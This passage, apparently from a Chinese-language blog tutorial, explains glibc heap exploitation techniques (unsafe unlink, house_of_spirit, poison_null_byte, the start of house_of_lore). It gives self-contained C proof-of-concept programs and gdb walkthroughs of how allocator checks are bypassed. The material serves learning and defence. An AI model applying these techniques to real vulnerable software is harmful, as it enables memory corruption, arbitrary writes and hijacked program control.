现在指向我们想要的位置，我们用它来覆盖我们的 victim string。\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;之前的值是: %s\n&quot;</span>,victim_string);<br>    chunk0_ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">0x4141414142424242</span>LL;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;新的值是: %s\n&quot;</span>,victim_string);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>​    这个程序展示了怎样利用 free 改写全局指针 chunk0_ptr 达到任意内存写的目的，即unsafe unlink。</p>
<p>​    运行一下看看</p>
<p> <img src="https://s2.loli.net/2021/12/26/xdJGagBlwskFinf.png" srcset="/img/loading.gif" lazyload></p>
<p>​    unlink有一个保护检查机制，在解链操作之前，针对堆块P自身的fd和bk 检查了链表的完整性，即判断堆块P的前一块fd的指针是否指向P，以及后一块bk的指针是否指向 P。</p>
<p>​    malloc_size设置为0x80，可以分配small chunk，然后定义header_size为2。申请两块空间，全局指针chunk0_ptr指向chunk0，局部指针chunk1_ptr 指向 chunk1。先在main函数上设置一个断点，然后单步走下一步，走到20行。</p>
<p>​    我们来看一下，申请了两个堆之后的情况。</p>
<p> <img src="https://s2.loli.net/2021/12/26/ZC1GbzYuLrhTHV7.png" srcset="/img/loading.gif" lazyload></p>
<p> <img src="https://s2.loli.net/2021/12/26/jG4UgWJpoimCnFB.png" srcset="/img/loading.gif" lazyload></p>
<p>接下来要绕过 (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False的检查，这个检查有个缺陷，就是fd/bk指针都是通过与chunk头部的相对地址来查找的，所以我们可以利用全局指针chunk0_ptr构造fake chunk来绕过它。</p>
<p>再单步走到40行。</p>
<p> <img src="https://s2.loli.net/2021/12/26/yVOo9LlKQU3zZjX.png" srcset="/img/loading.gif" lazyload></p>
<p>​    可以看到，我们在chunk0里构造一个fake chunk，用P表示，两个指针fd 和bk可以构成两条链：P-&gt;fd-&gt;bk == P，P-&gt;bk-&gt;fd == P，可以绕过检查。另外利用chunk0的溢出漏洞，通过修改chunk 1的 prev_size为fake chunk的大小，修改 PREV_INUSE标志位为0，将fake chunk伪造成一个free chunk。</p>
<p> <img src="https://s2.loli.net/2021/12/26/Sbfe9uoiYKvVp3P.png" srcset="/img/loading.gif" lazyload></p>
<p>​    我们的fake chunk的fd指向0x602058，然后0x602058的bk指向0x602070。fake chunk的bk指向0x602060，然后0x602060的fd指向 0x602070，可以保证前后都指向我们伪造的这个 chunk，完美！</p>
<p>​    接下来释放掉chunk1，因为fake chunk和chunk1是相邻的一个free chunk，所以会将他两个合并，这就需要对fake chunk进行unlink，进行如下操作：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">FD = P-&gt;fdBK = P-&gt;bkFD-&gt;bk = BKBK-&gt;fd = FD<br></code></pre></td></tr></table></figure>

<p>​    根据 fd 和 bk 指针在 malloc_chunk 结构体中的位置，这段代码等价于：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">FD = P-&gt;fd = &amp;P - <span class="hljs-number">24B</span>K = P-&gt;bk = &amp;P - <span class="hljs-number">16F</span>D-&gt;bk = *(&amp;P - <span class="hljs-number">24</span> + <span class="hljs-number">24</span>) = PFD-&gt;fd = *(&amp;P - <span class="hljs-number">16</span> + <span class="hljs-number">16</span>) = P<br></code></pre></td></tr></table></figure>

<p>这样就通过了 unlink 的检查，最终效果为：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">FD-&gt;bk = P = BK = &amp;P - <span class="hljs-number">16B</span>K-&gt;fd = P = FD = &amp;P - <span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>

<p>​    也就是说，chunk0_ptr 和 chunk0_ptr[3] 现在指向的是同一个地址</p>
<p> <img src="https://s2.loli.net/2021/12/26/oNGmvz9xDElKc73.png" srcset="/img/loading.gif" lazyload></p>
<p>   在这个图示中最终实现的效果是ptr中存的是ptr-0x18，如果本来ptr 是存的一个指针的，现在它指向了ptr-0x18。如果编辑这里的内容就可以往ptr-0x18那里去写，实现了覆盖这个指针为任意值的效果。</p>
<h2 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h2><p>   house_of_spirit是一种fastbins攻击方法，通过构造fake chunk，然后将其free掉，就可以在下一次malloc时返回fake chunk的地址，即任意我们可控的区域。House_of_spirit是一种通过堆的fast bin机制来辅助栈溢出的方法，一般的栈溢出漏洞的利用都希望能够覆盖函数的返回地址以控制EIP来劫持控制流，但如果栈溢出的长度无法覆盖返回地址，同时却可以覆盖栈上的一个即将被free的堆指针，此时可以将这个指针改写为栈上的地址并在相应位置构造一个fast bin块的元数据，接着在free操作时，这个栈上的堆块被放到fast bin中，下一次malloc对应的大小时，由于fast bin的先进后出机制，这个栈上的堆块被返回给用户，再次写入时就可能造成返回地址的改写。所以利用的第一步不是去控制一个 chunk，而是控制传给 free 函数的指针，将其指向一个fake chunk。所以 fake chunk的伪造是关键。</p>
<p>   源码如下。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这个例子演示了 house of spirit 攻击\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们将构造一个 fake chunk 然后释放掉它，这样再次申请的时候就会申请到它\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;覆盖一个指向 fastbin 的指针\n&quot;</span>);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *a, *b;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> fake_chunks[<span class="hljs-number">10</span>] __attribute__ ((aligned (<span class="hljs-number">16</span>)));<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这块区域 (长度为: %lu) 包含两个 chunk. 第一个在 %p 第二个在 %p.\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">9</span>]);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;构造 fake chunk 的 size，要比 chunk 大 0x10（因为 chunk 头），同时还要保证属于 fastbin，对于 fastbin 来说 prev_inuse 不会改变，但是其他两个位需要注意都要位 0\n&quot;</span>);<br>    fake_chunks[<span class="hljs-number">1</span>] = <span class="hljs-number">0x40</span>; <span class="hljs-comment">// size</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;next chunk 的大小也要注意，要大于 0x10 小于 av-&gt;system_mem（128kb）\n&quot;</span>);<br>        <span class="hljs-comment">// 这是fake_chunks[?]可以数一下</span><br>    fake_chunks[<span class="hljs-number">9</span>] = <span class="hljs-number">0x1234</span>; <span class="hljs-comment">// nextsize</span><br>    fake_chunks[<span class="hljs-number">2</span>] = <span class="hljs-number">0x4141414141414141</span>LL;<br>    fake_chunks[<span class="hljs-number">10</span>] = <span class="hljs-number">0x4141414141414141</span>LL;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在，我们拿伪造的那个 fake chunk 的地址进行 free, %p.\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">2</span>]);<br>    a = &amp;fake_chunks[<span class="hljs-number">2</span>];<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;free!\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(a);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在 malloc 的时候将会把 %p 给返回回来\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">2</span>]);<br>    b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;malloc(0x30): %p\n&quot;</span>, b);<br>    b[<span class="hljs-number">0</span>] = <span class="hljs-number">0x4242424242424242</span>LL;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;ok!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">gcc -g house_of_spirit.c -o house_of_spirit<br></code></pre></td></tr></table></figure>

<p>​    首先在程序的第 14 行下个断点</p>
<p>  运行到这里可以看到 fake_chunk 目前还没有被我们写入。</p>
<p> <img src="https://s2.loli.net/2021/12/26/wDyOdNUXPuYReb3.png" srcset="/img/loading.gif" lazyload></p>
<p>   我们直接让他写完，再来看一下，已经构造出fake chunk了。</p>
<p> <img src="D:\blog\source_posts\images\image-20211226160833206-16405140388341.png" srcset="/img/loading.gif" lazyload></p>
<p>对fake chunk进行free之后。</p>
<p> <img src="https://s2.loli.net/2021/12/26/6jPLABEZuC5l3y7.png" srcset="/img/loading.gif" lazyload></p>
<p>可以看一下fastbin，现在已经有了我们构造的哪个fake chunk了。</p>
<p> <img src="https://s2.loli.net/2021/12/26/SOMy7DpWr5Hgaj1.png" srcset="/img/loading.gif" lazyload></p>
<p>   接下来再次malloc一个相同大小的chunk就会把fastbin中的fake chunk申请过去。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);b[<span class="hljs-number">0</span>] = <span class="hljs-number">0x4242424242424242</span>LL;<br></code></pre></td></tr></table></figure>

<p> <img src="https://s2.loli.net/2021/12/26/YDqzityo6njvwJh.png" srcset="/img/loading.gif" lazyload></p>
<p>   伪造chunk时需要绕过一些检查，首先是标志位，<code>PREV_INUSE</code> 位并不影响 free的过程，但 <code>IS_MMAPPED</code> 位和 <code>NON_MAIN_ARENA</code> 位都要为零。其次，在64位系统中fast chunk的大小要在 32~128 字节之间。最后，是next chunk的大小，必须大于 <code>2*SIZE_SZ</code>（即大于16），小于 <code>av-&gt;system_mem</code>（即小于128kb），才能绕过对next chunk大小的检查。</p>
<p>​    所以house_of_spirit的主要目的是，当我们伪造的fake chunk内部存在不可控区域时，运用这一技术可以将这片区域变成可控的。上面为了方便观察，在 fake chunk里填充一些字母，但在现实中这些位置很可能是不可控的，而house_of_spirit也正是以此为目的而出现的。</p>
<h2 id="poison-null-byte"><a href="#poison-null-byte" class="headerlink" title="poison_null_byte"></a>poison_null_byte</h2><p>​    源码如下。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;当存在 off by null 的时候可以使用该技术\n&quot;</span>);<br><br>    <span class="hljs-keyword">uint8_t</span>* a;<br>    <span class="hljs-keyword">uint8_t</span>* b;<br>    <span class="hljs-keyword">uint8_t</span>* c;<br>    <span class="hljs-keyword">uint8_t</span>* b1;<br>    <span class="hljs-keyword">uint8_t</span>* b2;<br>    <span class="hljs-keyword">uint8_t</span>* d;<br>    <span class="hljs-keyword">void</span> *barrier;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;申请 0x100 的 chunk a\n&quot;</span>);<br>    a = (<span class="hljs-keyword">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;a 在: %p\n&quot;</span>, a);<br>    <span class="hljs-keyword">int</span> real_a_size = malloc_usable_size(a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;因为我们想要溢出 chunk a，所以需要知道他的实际大小: %#x\n&quot;</span>, real_a_size);<br><br>    b = (<span class="hljs-keyword">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;b: %p\n&quot;</span>, b);<br>    c = (<span class="hljs-keyword">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;c: %p\n&quot;</span>, c);<br><br>    barrier =  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;另外再申请了一个 chunk c：%p，防止 free 的时候与 top chunk 发生合并的情况\n&quot;</span>, barrier);<br><br>    <span class="hljs-keyword">uint64_t</span>* b_size_ptr = (<span class="hljs-keyword">uint64_t</span>*)(b - <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;会检查 chunk size 与 next chunk 的 prev_size 是否相等，所以要在后面一个 0x200 来绕过检查\n&quot;</span>);<br>    *(<span class="hljs-keyword">size_t</span>*)(b+<span class="hljs-number">0x1f0</span>) = <span class="hljs-number">0x200</span>;<br><br>    <span class="hljs-built_in">free</span>(b);<br>    <br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;b 的 size: %#lx\n&quot;</span>, *b_size_ptr);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;假设我们写 chunk a 的时候多写了一个 0x00 在 b 的 size 的 p 位上\n&quot;</span>);<br>    a[real_a_size] = <span class="hljs-number">0</span>; <span class="hljs-comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;b 现在的 size: %#lx\n&quot;</span>, *b_size_ptr);<br><br>    <span class="hljs-keyword">uint64_t</span>* c_prev_size_ptr = ((<span class="hljs-keyword">uint64_t</span>*)c)<span class="hljs-number">-2</span>;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;c 的 prev_size 是 %#lx\n&quot;</span>,*c_prev_size_ptr);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;但他根据 chunk b 的 size 找的时候会找到 b+0x1f0 那里，我们将会成功绕过 chunk 的检测 chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,*((<span class="hljs-keyword">size_t</span>*)(b<span class="hljs-number">-0x8</span>)), *(<span class="hljs-keyword">size_t</span>*)(b<span class="hljs-number">-0x10</span> + *((<span class="hljs-keyword">size_t</span>*)(b<span class="hljs-number">-0x8</span>))));<br>    b1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;申请一个 0x100 大小的 b1: %p\n&quot;</span>,b1);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在我们 malloc 了 b1 他将会放在 b 的位置，这时候 c 的 prev_size 依然是: %#lx\n&quot;</span>,*c_prev_size_ptr);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;但是我们之前写 0x200 那个地方已经改成了: %lx\n&quot;</span>,*(((<span class="hljs-keyword">uint64_t</span>*)c)<span class="hljs-number">-4</span>));<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;接下来 malloc &#x27;b2&#x27;, 作为 &#x27;victim&#x27; chunk.\n&quot;</span>);<br><br>    b2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;b2 申请在: %p\n&quot;</span>,b2);<br><br>    <span class="hljs-built_in">memset</span>(b2,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在 b2 填充的内容是:\n%s\n&quot;</span>,b2);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在对 b1 和 c 进行 free 因为 c 的 prev_size 是 0x210，所以会把他俩给合并，但是这时候里面还包含 b2 呐.\n&quot;</span>);<br><br>    <span class="hljs-built_in">free</span>(b1);<br>    <span class="hljs-built_in">free</span>(c);<br>    <br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这时候我们申请一个 0x300 大小的 chunk 就可以覆盖着 b2 了\n&quot;</span>);<br>    d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;d 申请到了: %p，我们填充一下 d 为 \&quot;D\&quot;\n&quot;</span>,d);<br>    <span class="hljs-built_in">memset</span>(d,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-number">0x300</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在 b2 的内容就是:\n%s\n&quot;</span>,b2);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>​    该技术适用的场景需要某个malloc的内存区域存在一个单字节溢出漏洞。通过溢出下一个chunk的size字段，攻击者能够在堆中创造出重叠的内存块，从而达到改写其他数据的目的。再结合其他的利用方式，同样能够获得程序的控制权。</p>
<p>​    编译完成之后，单步调试。首先申请了4个chunk，分别是a、b、c和一个防止与top chunk合并的chunk。</p>
<p>​     <img src="https://s2.loli.net/2021/12/26/kEyFYcx7LwpUvb1.png" srcset="/img/loading.gif" lazyload></p>
<p>​    接下来为了绕过size和next chunk的prev_size的检查，我们在chunk b的末尾伪造了一个0x200大小的prev_size</p>
<p> <img src="https://s2.loli.net/2021/12/26/1dlPECB5yGANDan.png" srcset="/img/loading.gif" lazyload></p>
<p>   然后把b给free掉，通过编辑chunk a来更改b的size的最后一位为0x00。</p>
<p> <img src="https://s2.loli.net/2021/12/26/3lNkeFrcX4zEMi2.png" srcset="/img/loading.gif" lazyload></p>
<p>​     这时候c那里的prev_size还是之前的，因为更改了b的size，所以找的时候会找b + 0x200的，而真正的prev_size位在0x210处，也正是这样让我们绕过了chunksize(P) = prev_size(next_chunk(P))的检测。</p>
<p>   接下来申请一个0x100大小的chunk，因为b已经被free了，所以glibc会将b进行切割，分出一块0x100大小的堆块给b1，剩下0xf0。</p>
<p> <img src="https://s2.loli.net/2021/12/26/jVTrtA6kOqgdDlS.png" srcset="/img/loading.gif" lazyload></p>
<p>   接下来再去申请一块小于0xf0的堆块，这样就会继续分割b剩下的那一块（我们把这次申请的堆块填充上’B’来区分）。</p>
<p> <img src="https://s2.loli.net/2021/12/26/1vGVAkyEuctxZML.png" srcset="/img/loading.gif" lazyload></p>
<p>   接下来free掉b1和c，因为c的prev_size仍然是0x210，按照这个去找的话就可以找到原本的b，现在的b1的位置，那么他们俩会合并，但是中间还有个b2呢。这里how2heap有一个注释。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"># <span class="hljs-function">Typically <span class="hljs-title">b2</span> <span class="hljs-params">(the victim)</span> will be a structure with valuable pointers that we want to control# 通常b2（受害者）将是一个结构，其中包含我们要控制的有价值的指针</span><br></code></pre></td></tr></table></figure>

<p> <img src="https://s2.loli.net/2021/12/26/42IyOtYRnhDbXLo.png" srcset="/img/loading.gif" lazyload></p>
<p>   那么接下来的事情就是申请一块大的chunk，然后随便改写b2的内容了。</p>
<p> <img src="https://s2.loli.net/2021/12/26/ojxtzO3HE846lr5.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house_of_lore"></a>house_of_lore</h2><p>​    源码如下。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">jackpot</span><span class="hljs-params">()</span></span>&#123; <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Nice jump d00d\n&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> * argv[])</span></span>&#123;<br><br>  <span class="hljs-keyword">intptr_t</span>* stack_buffer_1[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-keyword">intptr_t</span>* stack_buffer_2[<span class="hljs-number">3</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;定义了两个数组&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_buffer_1 在 %p\n&quot;</span>, (<span class="hljs-keyword">void</span>*)stack_buffer_1);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_buffer_2 在 %p\n&quot;</span>, (<span class="hljs-keyword">void</span>*)stack_buffer_2);<br><br>  <span class="hljs-keyword">intptr_t</span> *victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;申请第一块属于 fastbin 的 chunk 在 %p\n&quot;</span>, victim);<br>  <span class="hljs-keyword">intptr_t</span> *victim_chunk = victim<span class="hljs-number">-2</span>;<span class="hljs-comment">//chunk 开始的位置</span><br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;在栈上伪造一块 fake chunk\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;设置 fd 指针指向 victim chunk，来绕过 small bin 的检查，这样的话就能把堆栈地址放在到 small bin 的列表上\n&quot;</span>);<br>  stack_buffer_1[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  stack_buffer_1[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  stack_buffer_1[<span class="hljs-number">2</span>] = victim_chunk;<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;设置 stack_buffer_1 的 bk 指针指向 stack_buffer_2，设置 stack_buffer_2 的 fd 指针指向 stack_buffer_1 来绕过最后一个 malloc 中 small bin corrupted, 返回指向栈上假块的指针&quot;</span>);<br>  stack_buffer_1[<span class="hljs-number">3</span>] = (<span class="hljs-keyword">intptr_t</span>*)stack_buffer_2;<br>  